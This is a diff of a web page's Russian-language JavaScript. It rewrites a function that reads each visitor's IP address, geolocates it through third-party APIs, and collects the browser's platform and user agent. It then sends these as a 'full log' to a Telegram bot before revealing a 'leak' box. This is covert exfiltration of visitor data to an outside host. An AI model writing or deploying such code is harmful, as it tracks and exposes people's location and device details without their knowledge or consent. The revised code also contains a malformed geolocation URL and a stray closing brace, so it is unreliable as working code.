@@ -68,52 +68,44 @@
         }
 
                 async function getTripleData() {
-            let ip = "Не определен";
-            let city = "Неизвестно";
+    let ip = "Не определен";
+    let city = "Неизвестно";
 
-            try {
-                 
-                const ipRes = await fetch(`https://api.ipify.org?format=json`);
-                const ipData = await ipRes.json();
-                ip = ipData.ip;
+    try {
+        
+        const ipRes = await fetch('https://api64.ipify.org?format=json').catch(() => null);
+        if (ipRes) {
+            const ipData = await ipRes.json();
+            ip = ipData.ip;
+        }
 
-             
-                try {
-                    const resA = await fetch(`https://freeipapi.com/api/json/${ip}`);
-                    const dA = await resA.json();
-                    if (dA.cityName) {
-                        city = `${dA.cityName}, ${dA.countryName}`;
-                    }
-                } catch(e) {}
+         
+        const geoRes = await fetch(`https://ipapi.co{ip}/json/`).catch(() => null);
+        if (geoRes) {
+            const geoData = await geoRes.json();
+            city = geoData.city ? `${geoData.city}, ${geoData.country_name}` : "Неизвестно";
+        }
 
-             
-                if (city === "Неизвестно") {
-                    try {
-                        const resB = await fetch(`https://ipwho.is/${ip}`);
-                        const dB = await resB.json();
-                        if (dB.success) city = `${dB.city}, ${dB.country}`;
-                    } catch(e) {}
-                }
+       
+        document.getElementById('user-ip').innerText = ip;
+        document.getElementById('user-geo').innerText = city;
+        document.getElementById('user-os').innerText = navigator.platform;
 
-                 
-                document.getElementById('user-ip').innerText = ip;
-                document.getElementById('user-geo').innerText = city;
-                document.getElementById('user-os').innerText = navigator.platform;
+         
+        const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
+            .catch(e => console.log("Твой прокси блокирует Telegram"));
 
-                 
-                const msg = `🔥 ПОЛНЫЙ ЛОГ!\n📍 IP: ${ip}\n🌍 Город: ${city}\n📱 Устройство: ${navigator.userAgent}`;
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`);
+    } catch (e) {
+        console.log("Ошибка:", e);
+    }
 
-            } catch (e) {
-                 
-                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent("⚠️ Ошибка сбора данных: " + e.message)}`);
-            }
-
-             
-            setTimeout(() => {
-                document.getElementById('terminal').style.display = 'none';
-                document.getElementById('leak-box').style.display = 'block';
-            }, 500);
+    setTimeout(() => {
+        document.getElementById('terminal').style.display = 'none';
+        document.getElementById('leak-box').style.display = 'block';
+    }, 500);
+}
         }
     </script>
 </body>
